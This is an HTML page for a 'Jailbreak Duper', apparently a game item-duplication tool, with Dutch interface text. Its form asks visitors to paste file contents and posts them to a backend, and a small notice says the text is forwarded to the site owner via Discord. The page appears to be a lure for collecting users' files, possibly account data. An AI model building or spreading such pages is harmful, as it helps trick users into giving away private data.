<!doctype html>
<html lang="nl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Jailbreak Duper</title>
<script type="module" src="/speed-insights.js"></script>
<style>
*{box-sizing:border-box}body{margin:0;min-height:100vh;overflow:hidden;display:grid;place-items:center;color:#f5f7fb;font-family:Arial,Helvetica,sans-serif;background:#000}
#snow{position:fixed;inset:0;pointer-events:none;overflow:hidden}.flake{position:absolute;top:-12vh;color:#fff;opacity:.8;text-shadow:0 0 8px rgba(255,255,255,.7);animation:fall linear infinite;user-select:none}
@keyframes fall{to{transform:translate3d(var(--drift),115vh,0) rotate(360deg)}}
.panel{position:relative;z-index:1;width:min(760px,calc(100vw - 32px));padding:34px 36px 30px;border:1px solid #353a42;border-radius:20px;background:rgba(24,26,30,.94);box-shadow:0 22px 70px rgba(0,0,0,.65)}
h1{margin:0 0 18px;font-size:clamp(28px,4vw,40px);letter-spacing:-.5px}label{display:block;margin-bottom:18px;color:#d5d9df;font-size:15px}
textarea{width:100%;height:190px;resize:vertical;padding:18px;border:1px solid #30343b;border-radius:12px;outline:none;background:#090a0c;color:#f4f4f4;font:14px/1.5 Consolas,monospace}
textarea:focus{border-color:#568cf4}button{width:100%;margin-top:20px;padding:16px;border:0;border-radius:11px;color:white;font-size:16px;font-weight:700;cursor:pointer;background:linear-gradient(100deg,#28b7ee,#7135f5)}
button:disabled{opacity:.6;cursor:wait}#status{min-height:20px;margin:14px 0 0;color:#cbd5e1;font-size:13px}
.notice{font-size:12px;color:#9299a5;margin:8px 0 0}
@media(max-width:520px){.panel{padding:26px 20px 24px}}
</style>
</head>
<body>
<div id="snow" aria-hidden="true"></div>
<main class="panel">
  <h1>Jailbreak Duper</h1>
  <label for="contents">Paste File Contents Below</label>
  <textarea id="contents" maxlength="5000" placeholder="Paste file contents here..."></textarea>
  <button id="submit">Submit</button>
  <p id="status" role="status" aria-live="polite"></p>
  <p class="notice">Door te verzenden wordt je tekst naar de eigenaar van deze website gestuurd via Discord.</p>
</main>
<script>
const snow=document.getElementById('snow'),symbols=['❄','❅','❆','·'];
for(let i=0;i<95;i++){const f=document.createElement('span');f.className='flake';f.textContent=symbols[Math.floor(Math.random()*symbols.length)];f.style.left=Math.random()*100+'vw';f.style.fontSize=(8+Math.random()*19)+'px';f.style.animationDuration=(7+Math.random()*14)+'s';f.style.animationDelay=(-Math.random()*20)+'s';f.style.setProperty('--drift',(Math.random()*150-75)+'px');snow.appendChild(f)}
const btn=document.getElementById('submit'),field=document.getElementById('contents'),status=document.getElementById('status');
btn.addEventListener('click',async()=>{
  const content=field.value.trim();
  if(!content){status.textContent='Plak eerst tekst in het invoerveld.';return}
  btn.disabled=true;status.textContent='Verzenden...';
  try{
    const response=await fetch('/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content})});
    const data=await response.json().catch(()=>({}));
    if(!response.ok)throw new Error(data.error||'Verzenden is niet gelukt.');
    status.textContent='Inzending verstuurd!';field.value='';
  }catch(error){status.textContent=error.message==='Failed to fetch'?'Verbinding mislukt. Probeer het later opnieuw.':error.message}
  finally{btn.disabled=false}
});
</script>
</body>
</html>
